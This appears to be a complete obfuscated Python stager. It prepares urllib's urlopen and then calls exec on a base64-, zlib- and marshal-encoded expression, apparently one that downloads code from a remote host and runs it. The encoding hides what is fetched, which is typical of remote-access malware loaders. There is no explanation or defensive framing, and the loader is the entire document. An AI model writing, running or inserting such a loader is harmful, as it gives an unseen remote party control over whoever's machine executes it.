import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWJgYCgtyskvSM3TUM8oKSmw0tc3M9EzMjLXM9QzMjazMjQ2ttDXLy5JTE8tKtbPdXfVK6hU19QrSk1M0dAEAC3XEcE=')))))